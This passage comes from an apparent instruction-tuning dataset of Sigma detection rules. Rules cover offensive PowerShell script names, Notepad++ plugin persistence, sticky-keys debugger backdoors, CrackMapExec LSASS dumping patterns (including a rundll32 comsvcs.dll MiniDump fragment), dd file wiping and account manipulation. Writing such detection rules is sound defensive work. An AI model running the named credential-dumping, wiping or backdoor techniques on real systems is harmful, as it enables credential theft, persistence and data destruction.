'PowerSharpPack.ps1'\n            - 'PowerUp.ps1'\n            - 'PowerUpSQL.ps1'\n            - 'PowerView.ps1'\n            - 'PSAsyncShell.ps1'\n            - 'RemoteHashRetrieval.ps1'\n            - 'Remove-Persistence.ps1'\n            - 'Remove-PoshRat.ps1'\n            - 'Remove-Update.ps1'\n            - 'Run-EXEonRemote.ps1'\n            - 'Schtasks-Backdoor.ps1'\n            - 'Set-DCShadowPermissions.ps1'\n            - 'Set-MacAttribute.ps1'\n            - 'Set-RemotePSRemoting.ps1'\n            - 'Set-RemoteWMI.ps1'\n            - 'Set-Wallpaper.ps1'\n            - 'Show-TargetScreen.ps1'\n            - 'Speak.ps1'\n            - 'Start-CaptureServer.ps1'\n            - 'Start-WebcamRecorder.ps1'\n            - 'StringToBase64.ps1'\n            - 'TexttoExe.ps1'\n            - 'VolumeShadowCopyTools.ps1'\n            - 'WinPwn.ps1'\n            - 'WSUSpendu.ps1'\n    selection_invoke_sharp:\n        ContextInfo|contains|all:\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - '.ps1'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_generic:\n        ContextInfo|contains:\n            - 'Add-ConstrainedDelegationBackdoor.ps1'\n            - 'Add-Exfiltration.ps1'\n            - 'Add-Persistence.ps1'\n            - 'Add-RegBackdoor.ps1'\n            - 'Add-RemoteRegBackdoor.ps1'\n            - 'Add-ScrnSaveBackdoor.ps1'\n            - 'Check-VM.ps1'\n            - 'ConvertTo-ROT13.ps1'\n            - 'Copy-VSS.ps1'\n            - 'Create-MultipleSessions.ps1'\n            - 'DNS_TXT_Pwnage.ps1'\n            - 'Do-Exfiltration.ps1'\n            - 'DomainPasswordSpray.ps1'\n            - 'Download_Execute.ps1'\n            - 'Download-Execute-PS.ps1'\n            - 'Enabled-DuplicateToken.ps1'\n            - 'Enable-DuplicateToken.ps1'\n            - 'Execute-Command-MSSQL.ps1'\n            - 'Execute-DNSTXT-Code.ps1'\n            - 'Execute-OnTime.ps1'\n            - 'ExetoText.ps1'\n            - 'Exploit-Jboss.ps1'\n            - 'Find-AVSignature.ps1'\n            - 'Find-Fruit.ps1'\n            - 'Find-GPOLocation.ps1'\n            - 'Find-TrustedDocuments.ps1'\n            - 'FireBuster.ps1'\n            - 'FireListener.ps1'\n            - 'Get-ApplicationHost.ps1'\n            - 'Get-ChromeDump.ps1'\n            - 'Get-ClipboardContents.ps1'\n            - 'Get-ComputerDetail.ps1'\n            - 'Get-FoxDump.ps1'\n            - 'Get-GPPAutologon.ps1'\n            - 'Get-GPPPassword.ps1'\n            - 'Get-IndexedItem.ps1'\n            - 'Get-Keystrokes.ps1'\n            - 'Get-LSASecret.ps1'\n            - 'Get-MicrophoneAudio.ps1'\n            - 'Get-PassHashes.ps1'\n            - 'Get-PassHints.ps1'\n            - 'Get-RegAlwaysInstallElevated.ps1'\n            - 'Get-RegAutoLogon.ps1'\n            - 'Get-RickAstley.ps1'\n            - 'Get-Screenshot.ps1'\n            - 'Get-SecurityPackages.ps1'\n            - 'Get-ServiceFilePermission.ps1'\n            - 'Get-ServicePermission.ps1'\n            - 'Get-ServiceUnquoted.ps1'\n            - 'Get-SiteListPassword.ps1'\n            - 'Get-System.ps1'\n            - 'Get-TimedScreenshot.ps1'\n            - 'Get-UnattendedInstallFile.ps1'\n            - 'Get-Unconstrained.ps1'\n            - 'Get-USBKeystrokes.ps1'\n            - 'Get-VaultCredential.ps1'\n            - 'Get-VulnAutoRun.ps1'\n            - 'Get-VulnSchTask.ps1'\n            - 'Get-WebConfig.ps1'\n            - 'Get-WebCredentials.ps1'\n            - 'Get-WLAN-Keys.ps1'\n            - 'Gupt-Backdoor.ps1'\n            - 'HTTP-Backdoor.ps1'\n            - 'HTTP-Login.ps1'\n            - 'Install-ServiceBinary.ps1'\n            - 'Install-SSP.ps1'\n            - 'Invoke-ACLScanner.ps1'\n            - 'Invoke-ADSBackdoor.ps1'\n            - 'Invoke-AmsiBypass.ps1'\n            - 'Invoke-ARPScan.ps1'\n            - 'Invoke-BackdoorLNK.ps1'\n            - 'Invoke-BadPotato.ps1'\n            - 'Invoke-BetterSafetyKatz.ps1'\n            - 'Invoke-BruteForce.ps1'\n            - 'Invoke-BypassUAC.ps1'\n            - 'Invoke-Carbuncle.ps1'\n            - 'Invoke-Certify.ps1'\n            - 'Invoke-ConPtyShell.ps1'\n            - 'Invoke-CredentialInjection.ps1'\n            - 'Invoke-CredentialsPhish.ps1'\n            - 'Invoke-DAFT.ps1'\n            - 'Invoke-DCSync.ps1'\n            - 'Invoke-Decode.ps1'\n            - 'Invoke-DinvokeKatz.ps1'\n            - 'Invoke-DllInjection.ps1'\n            - 'Invoke-DowngradeAccount.ps1'\n            - 'Invoke-EgressCheck.ps1'\n            - 'Invoke-Encode.ps1'\n            - 'Invoke-EventViewer.ps1'\n            - 'Invoke-Eyewitness.ps1'\n            - 'Invoke-FakeLogonScreen.ps1'\n            - 'Invoke-Farmer.ps1'\n            - 'Invoke-Get-RBCD-Threaded.ps1'\n            - 'Invoke-Gopher.ps1'\n            - 'Invoke-Grouper2.ps1'\n            - 'Invoke-Grouper3.ps1'\n            - 'Invoke-HandleKatz.ps1'\n            - 'Invoke-Interceptor.ps1'\n            - 'Invoke-Internalmonologue.ps1'\n            - 'Invoke-Inveigh.ps1'\n            - 'Invoke-InveighRelay.ps1'\n            - 'Invoke-JSRatRegsvr.ps1'\n            - 'Invoke-JSRatRundll.ps1'\n            - 'Invoke-KrbRelay.ps1'\n            - 'Invoke-KrbRelayUp.ps1'\n            - 'Invoke-LdapSignCheck.ps1'\n            - 'Invoke-Lockless.ps1'\n            - 'Invoke-MalSCCM.ps1'\n            - 'Invoke-Mimikatz.ps1'\n            - 'Invoke-MimikatzWDigestDowngrade.ps1'\n            - 'Invoke-Mimikittenz.ps1'\n            - 'Invoke-MITM6.ps1'\n            - 'Invoke-NanoDump.ps1'\n            - 'Invoke-NetRipper.ps1'\n            - 'Invoke-NetworkRelay.ps1'\n            - 'Invoke-NinjaCopy.ps1'\n            - 'Invoke-OxidResolver.ps1'\n            - 'Invoke-P0wnedshell.ps1'\n            - 'Invoke-P0wnedshellx86.ps1'\n            - 'Invoke-Paranoia.ps1'\n            - 'Invoke-PortScan.ps1'\n            - 'Invoke-PoshRatHttp.ps1'\n            - 'Invoke-PoshRatHttps.ps1'\n            - 'Invoke-PostExfil.ps1'\n            - 'Invoke-PowerDump.ps1'\n            - 'Invoke-PowerShellIcmp.ps1'\n            - 'Invoke-PowerShellTCP.ps1'\n            - 'Invoke-PowerShellTcpOneLine.ps1'\n            - 'Invoke-PowerShellTcpOneLineBind.ps1'\n            - 'Invoke-PowerShellUdp.ps1'\n            - 'Invoke-PowerShellUdpOneLine.ps1'\n            - 'Invoke-PowerShellWMI.ps1'\n            - 'Invoke-PowerThIEf.ps1'\n            - 'Invoke-PPLDump.ps1'\n            - 'Invoke-Prasadhak.ps1'\n            - 'Invoke-PsExec.ps1'\n            - 'Invoke-PsGcat.ps1'\n            - 'Invoke-PsGcatAgent.ps1'\n            - 'Invoke-PSInject.ps1'\n            - 'Invoke-PsUaCme.ps1'\n            - 'Invoke-ReflectivePEInjection.ps1'\n            - 'Invoke-ReverseDNSLookup.ps1'\n            - 'Invoke-Rubeus.ps1'\n            - 'Invoke-RunAs.ps1'\n            - 'Invoke-SafetyKatz.ps1'\n            - 'Invoke-SauronEye.ps1'\n            - 'Invoke-SCShell.ps1'\n            - 'Invoke-Seatbelt.ps1'\n            - 'Invoke-ServiceAbuse.ps1'\n            - 'Invoke-SessionGopher.ps1'\n            - 'Invoke-ShellCode.ps1'\n            - 'Invoke-SMBScanner.ps1'\n            - 'Invoke-Snaffler.ps1'\n            - 'Invoke-Spoolsample.ps1'\n            - 'Invoke-SSHCommand.ps1'\n            - 'Invoke-SSIDExfil.ps1'\n            - 'Invoke-StandIn.ps1'\n            - 'Invoke-StickyNotesExtract.ps1'\n            - 'Invoke-Tater.ps1'\n            - 'Invoke-Thunderfox.ps1'\n            - 'Invoke-ThunderStruck.ps1'\n            - 'Invoke-TokenManipulation.ps1'\n            - 'Invoke-Tokenvator.ps1'\n            - 'Invoke-TotalExec.ps1'\n            - 'Invoke-UrbanBishop.ps1'\n            - 'Invoke-UserHunter.ps1'\n            - 'Invoke-VoiceTroll.ps1'\n            - 'Invoke-Whisker.ps1'\n            - 'Invoke-WinEnum.ps1'\n            - 'Invoke-winPEAS.ps1'\n            - 'Invoke-WireTap.ps1'\n            - 'Invoke-WmiCommand.ps1'\n            - 'Invoke-WScriptBypassUAC.ps1'\n            - 'Invoke-Zerologon.ps1'\n            - 'Keylogger.ps1'\n            - 'MailRaider.ps1'\n            - 'New-HoneyHash.ps1'\n            - 'OfficeMemScraper.ps1'\n            - 'Offline_Winpwn.ps1'\n            - 'Out-CHM.ps1'\n            - 'Out-DnsTxt.ps1'\n            - 'Out-Excel.ps1'\n            - 'Out-HTA.ps1'\n            - 'Out-Java.ps1'\n            - 'Out-JS.ps1'\n            - 'Out-Minidump.ps1'\n            - 'Out-RundllCommand.ps1'\n            - 'Out-SCF.ps1'\n            - 'Out-SCT.ps1'\n            - 'Out-Shortcut.ps1'\n            - 'Out-WebQuery.ps1'\n            - 'Out-Word.ps1'\n            - 'Parse_Keys.ps1'\n            - 'Port-Scan.ps1'\n            - 'PowerBreach.ps1'\n            - 'powercat.ps1'\n            - 'PowerRunAsSystem.psm1'\n            - 'PowerSharpPack.ps1'\n            - 'PowerUp.ps1'\n            - 'PowerUpSQL.ps1'\n            - 'PowerView.ps1'\n            - 'PSAsyncShell.ps1'\n            - 'RemoteHashRetrieval.ps1'\n            - 'Remove-Persistence.ps1'\n            - 'Remove-PoshRat.ps1'\n            - 'Remove-Update.ps1'\n            - 'Run-EXEonRemote.ps1'\n            - 'Schtasks-Backdoor.ps1'\n            - 'Set-DCShadowPermissions.ps1'\n            - 'Set-MacAttribute.ps1'\n            - 'Set-RemotePSRemoting.ps1'\n            - 'Set-RemoteWMI.ps1'\n            - 'Set-Wallpaper.ps1'\n            - 'Show-TargetScreen.ps1'\n            - 'Speak.ps1'\n            - 'Start-CaptureServer.ps1'\n            - 'Start-WebcamRecorder.ps1'\n            - 'StringToBase64.ps1'\n            - 'TexttoExe.ps1'\n            - 'VolumeShadowCopyTools.ps1'\n            - 'WinPwn.ps1'\n            - 'WSUSpendu.ps1'\n    selection_invoke_sharp:\n        ContextInfo|contains|all:\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - '.ps1'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of known offensive powershell scripts used for exploitation or reconnaissance",
      "answer": "In order to detect the execution of known offensive PowerShell scripts used for exploitation or reconnaissance, you should monitor PowerShell module logs on Windows systems. Specifically, look for evidence of script execution that matches a comprehensive list of known malicious scripts. These scripts span a variety of tactics and techniques, suggesting the potential involvement of several MITRE ATT&CK tactics such as Credential Access, Execution, Defense Evasion, Persistence, Privilege Escalation, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact.\n\nDetection should focus on script names within the PowerShell module logs, including, but not limited to:\n\n- Scripts for adding backdoors, exfiltration, persistence mechanisms, and registry modifications (`Add-ConstrainedDelegationBackdoor.ps1`, `Add-Exfiltration.ps1`, `Add-Persistence.ps1`, etc.).\n- Tools for system reconnaissance, like checking for VM presence, extracting passwords, and more (`Check-VM.ps1`, `Get-PassHashes.ps1`, `Find-AVSignature.ps1`, etc.).\n- Means for bypassing security measures, executing remote commands, and performing lateral movement (`Invoke-BypassUAC.ps1`, `Invoke-CredentialInjection.ps1`, `Execute-Command-MSSQL.ps1`, etc.).\n- Scripts that aid in collecting sensitive data, such as keystrokes and screenshot capturing (`Get-Keystrokes.ps1`, `Get-Screenshot.ps1`, etc.).\n- Utility and exploitation scripts, including those for performing network scans, credential dumping, and injecting malicious payloads (`Port-Scan.ps1`, `Invoke-Mimikatz.ps1`, `Invoke-ReflectivePEInjection.ps1`, etc.).\n\nAdditionally, scripts containing 'Invoke-Sharp' followed by '.ps1', representing a variety of potentially malicious activities performed through custom PowerShell code, should raise alerts.\n\nThese monitoring efforts are crucial for identifying potential hostile activities early on, enabling timely response actions. Due to the nature of these scripts and techniques, encounters will likely represent high-severity incidents that necessitate further investigation, though it's acknowledged that there may be scenarios in which their presence or execution does not indicate a clear threat (marked as unknown false positives).\n\nSuch vigilance is critical for maintaining the integrity, confidentiality, and availability of IT environments against adversaries seeking to exploit PowerShell as a vector for attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\". Which could indicates possible persistence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\", which could indicate possible persistence, you should: Monitor Windows file event logs for any new \".dll\" files being created or added to the Notepad++ plugins directory. This detection focuses on identifying \".dll\" files because these can be utilized by adversaries to maintain persistence on a compromised system by executing malicious code. Important to note, any occurrences where the process responsible for creating or modifying these \".dll\" files is not 'gup.exe', the updater for Notepad++, should be scrutinized. The rule specifically excludes files added or modified by 'gup.exe', as well as during initial installation procedures or when sourcing from 'C:\\Users\\' within '\\AppData\\Local\\Temp\\' directory, aiming to reduce false positives such as legitimate updates or plugin expansions initiated by users. Detection of such activity is flagged with a medium level of concern due to the potential misuse of legitimate software to sustain unauthorized access or control within a targeted environment. Be aware, legitimate use of custom plugins or initial installation of Notepad++ may also trigger alerts under this criterion, which are considered potential false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\Notepad++\\plugins\\'\n        TargetFilename|endswith: '.dll'\n    filter_gup:\n        Image|endswith: '\\Notepad++\\updater\\gup.exe'\n    filter_install:\n        # This filter is for Sigma dataset you could remove it or change when using the rule in your own env\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\Temp\\'\n        Image|endswith:\n            - '\\target.exe'\n            - 'Installer.x64.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Possible FPs during first installation of Notepad++\n    - Legitimate use of custom plugins by users in order to enhance notepad++ functionalities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\Notepad++\\plugins\\'\n        TargetFilename|endswith: '.dll'\n    filter_gup:\n        Image|endswith: '\\Notepad++\\updater\\gup.exe'\n    filter_install:\n        # This filter is for Sigma dataset you could remove it or change when using the rule in your own env\n        Image|startswith: 'C:\\Users\\'\n        Image|contains: '\\AppData\\Local\\Temp\\'\n        Image|endswith:\n            - '\\target.exe'\n            - 'Installer.x64.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Possible FPs during first installation of Notepad++\n    - Legitimate use of custom plugins by users in order to enhance notepad++ functionalities\nlevel: medium\n",
      "question": "creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\". Which could indicates possible persistence",
      "answer": "In order to detect creation of new \".dll\" files inside the plugins directory of a notepad++ installation by a process other than \"gup.exe\", which could indicate possible persistence, you should: Monitor Windows file event logs for any new \".dll\" files being created or added to the Notepad++ plugins directory. This detection focuses on identifying \".dll\" files because these can be utilized by adversaries to maintain persistence on a compromised system by executing malicious code. Important to note, any occurrences where the process responsible for creating or modifying these \".dll\" files is not 'gup.exe', the updater for Notepad++, should be scrutinized. The rule specifically excludes files added or modified by 'gup.exe', as well as during initial installation procedures or when sourcing from 'C:\\Users\\' within '\\AppData\\Local\\Temp\\' directory, aiming to reduce false positives such as legitimate updates or plugin expansions initiated by users. Detection of such activity is flagged with a medium level of concern due to the potential misuse of legitimate software to sustain unauthorized access or control within a targeted environment. Be aware, legitimate use of custom plugins or initial installation of Notepad++ may also trigger alerts under this criterion, which are considered potential false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen, you should monitor the Windows Registry for any modifications to Image File Execution Options for specific executable files. This includes looking for changes related to setting a debugger for executables such as 'sethc.exe', 'utilman.exe', 'osk.exe', 'Magnify.exe', 'Narrator.exe', 'DisplaySwitch.exe', 'atbroker.exe', and 'HelpPane.exe'. These tools are accessible from the login screen, and altering their execution path can allow an attacker to plant a backdoor on the system. Your detection should focus on registry events, specifically targeting the additions or modifications within the 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' key. It is critical to investigate any such changes as they are unlikely to be benign and indicate a severe level of threat due to the potential for unauthorized access or control over the affected system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_registry:\n        TargetObject|endswith:\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\HelpPane.exe\\Debugger'\n    condition: selection_registry\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection_registry:\n        TargetObject|endswith:\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\atbroker.exe\\Debugger'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\HelpPane.exe\\Debugger'\n    condition: selection_registry\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen",
      "answer": "In order to detect the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen, you should monitor the Windows Registry for any modifications to Image File Execution Options for specific executable files. This includes looking for changes related to setting a debugger for executables such as 'sethc.exe', 'utilman.exe', 'osk.exe', 'Magnify.exe', 'Narrator.exe', 'DisplaySwitch.exe', 'atbroker.exe', and 'HelpPane.exe'. These tools are accessible from the login screen, and altering their execution path can allow an attacker to plant a backdoor on the system. Your detection should focus on registry events, specifically targeting the additions or modifications within the 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options' key. It is critical to investigate any such changes as they are unlikely to be benign and indicate a severe level of threat due to the potential for unauthorized access or control over the affected system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process patterns found in logs when CrackMapExec is used.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious process patterns found in logs when CrackMapExec is used, you should monitor the Windows process creation logs for certain command line patterns that could indicate malicious activity. Focus on detecting instances where the command line involves looking for the lsass.exe process using tasklist with a filter for 'Imagename eq lsass.exe', potentially combined with use of cmd.exe through various command switches (/c, /r, /k). This might be an attempt to execute commands or scripts in a way that hides their true nature or persists them across sessions. Additionally, check for command lines that execute rundll32.exe with a path to comsvcs.dll for MiniDump creation, specifically targeting the lsass process, which might be done to dump credentials from memory and often involves specifying a path in the Windows Temp directory. Also, pay attention to the use of tasklist to list processes with verbose output filtered for 'lsass' combined with the use of findstr, which could indicate an attempt to identify the lsass process for similar malicious purposes. The user account initiating these commands might have a name containing 'AUTHORI' or 'AUTORI', indicating a possible non-English language setting. Identifying these patterns helps in mitigating against tactics and techniques such as Credential Access through LSASS Memory dumping. Be aware that there might be legitimate uses of these commands that could lead to false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_lsass_dump1:\n        CommandLine|contains|all:\n            - 'tasklist /fi '\n            - 'Imagename eq lsass.exe'\n        CommandLine|contains:\n            - 'cmd.exe /c '\n            - 'cmd.exe /r '\n            - 'cmd.exe /k '\n            - 'cmd /c '\n            - 'cmd /r '\n            - 'cmd /k '\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_lsass_dump2:\n        CommandLine|contains|all:\n            - 'do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump'\n            - '\\Windows\\Temp\\'\n            - ' full'\n            - '%%B'\n    selection_procdump:\n        CommandLine|contains|all:\n            - 'tasklist /v /fo csv'\n            - 'findstr /i \"lsass\"'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_lsass_dump1:\n        CommandLine|contains|all:\n            - 'tasklist /fi '\n            - 'Imagename eq lsass.exe'\n        CommandLine|contains:\n            - 'cmd.exe /c '\n            - 'cmd.exe /r '\n            - 'cmd.exe /k '\n            - 'cmd /c '\n            - 'cmd /r '\n            - 'cmd /k '\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_lsass_dump2:\n        CommandLine|contains|all:\n            - 'do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump'\n            - '\\Windows\\Temp\\'\n            - ' full'\n            - '%%B'\n    selection_procdump:\n        CommandLine|contains|all:\n            - 'tasklist /v /fo csv'\n            - 'findstr /i \"lsass\"'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious process patterns found in logs when CrackMapExec is used",
      "answer": "In order to detect suspicious process patterns found in logs when CrackMapExec is used, you should monitor the Windows process creation logs for certain command line patterns that could indicate malicious activity. Focus on detecting instances where the command line involves looking for the lsass.exe process using tasklist with a filter for 'Imagename eq lsass.exe', potentially combined with use of cmd.exe through various command switches (/c, /r, /k). This might be an attempt to execute commands or scripts in a way that hides their true nature or persists them across sessions. Additionally, check for command lines that execute rundll32.exe with a path to comsvcs.dll for MiniDump creation, specifically targeting the lsass process, which might be done to dump credentials from memory and often involves specifying a path in the Windows Temp directory. Also, pay attention to the use of tasklist to list processes with verbose output filtered for 'lsass' combined with the use of findstr, which could indicate an attempt to identify the lsass process for similar malicious purposes. The user account initiating these commands might have a name containing 'AUTHORI' or 'AUTORI', indicating a possible non-English language setting. Identifying these patterns helps in mitigating against tactics and techniques such as Credential Access through LSASS Memory dumping. Be aware that there might be legitimate uses of these commands that could lead to false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting overwriting (effectively wiping/deleting) of a file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect overwriting (effectively wiping/deleting) of a file, you should: Monitor and analyze logs from the Linux audit daemon (`auditd`) for execution events (`EXECVE`) specifically involving the `dd` command. The detection focuses on identifying instances where `dd` is invoked with the input file (`if=`) argument set to either `/dev/null` or `/dev/zero`. This tactic might be used by an attacker to overwrite and consequently wipe a file, rendering it empty or filled with zeroes. It is important to consider that there could be false positives, such as legitimate uses of `dd` for appending null bytes to files or for intentionally overwriting files as part of a benign process. The security level for these alerts is considered low due to the potential for legitimate use cases that mirror the detection criteria.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains: 'dd'\n        a1|contains:\n            - 'if=/dev/null'\n            - 'if=/dev/zero'\n    condition: selection\nfalsepositives:\n    - Appending null bytes to files.\n    - Legitimate overwrite of files.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection:\n        type: 'EXECVE'\n        a0|contains: 'dd'\n        a1|contains:\n            - 'if=/dev/null'\n            - 'if=/dev/zero'\n    condition: selection\nfalsepositives:\n    - Appending null bytes to files.\n    - Legitimate overwrite of files.\nlevel: low\n",
      "question": "overwriting (effectively wiping/deleting) of a file.",
      "answer": "In order to detect overwriting (effectively wiping/deleting) of a file, you should: Monitor and analyze logs from the Linux audit daemon (`auditd`) for execution events (`EXECVE`) specifically involving the `dd` command. The detection focuses on identifying instances where `dd` is invoked with the input file (`if=`) argument set to either `/dev/null` or `/dev/zero`. This tactic might be used by an attacker to overwrite and consequently wipe a file, rendering it empty or filled with zeroes. It is important to consider that there could be false positives, such as legitimate uses of `dd` for appending null bytes to files or for intentionally overwriting files as part of a benign process. The security level for these alerts is considered low due to the potential for legitimate use cases that mirror the detection criteria."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may manipulate accounts to maintain access to victim systems.\nAccount manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries manipulating accounts to maintain access to victim systems, which may involve actions like modifying credentials or permission groups, you should monitor for PowerShell script activity related to user account manipulation on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture the execution of PowerShell scripts. Look for scripts containing commands that either create, rename, remove, disable, enable, retrieve, or modify local user accounts, including 'Disable-LocalUser', 'Enable-LocalUser', 'Get-LocalUser', 'Set-LocalUser', 'New-LocalUser', 'Rename-LocalUser', and 'Remove-LocalUser'. It's important to note that while detecting these commands can indicate malicious account manipulation, there may also be legitimate administrative reasons for their use, and thus they may generate false positives. These activities are associated with tactics and techniques of maintaining access and potentially escalating privileges within a compromised system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Disable-LocalUser'\n            - 'Enable-LocalUser'\n            - 'Get-LocalUser'\n            - 'Set-LocalUser'\n            - 'New-LocalUser'\n            - 'Rename-LocalUser'\n            - 'Remove-LocalUser'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'Disable-LocalUser'\n            - 'Enable-LocalUser'\n            - 'Get-LocalUser'\n            - 'Set-LocalUser'\n            - 'New-LocalUser'\n            - 'Rename-LocalUser'\n            - 'Remove-LocalUser'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
      "question": "Adversaries may manipulate accounts to maintain access to victim systems.\nAccount manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups\n",
      "answer": "In order to detect adversaries manipulating accounts to maintain access to victim systems, which may involve actions like modifying credentials or permission groups, you should monitor for PowerShell script activity related to user account manipulation on Windows systems. Specifically, ensure that Script Block Logging is enabled to capture the execution of PowerShell scripts. Look for scripts containing commands that either create, rename, remove, disable, enable, retrieve, or modify local user accounts, including 'Disable-LocalUser', 'Enable-LocalUser', 'Get-LocalUser', 'Set-LocalUser', 'New-LocalUser', 'Rename-LocalUser', and 'Remove-LocalUser'. It's important to note that while detecting these commands can indicate malicious account manipulation, there may also be legitimate administrative reasons for their use, and thus they may generate false positives. These activities are associated with tactics and techniques of maintaining access and potentially escalating privileges within a compromised system."
    }
  },
  {
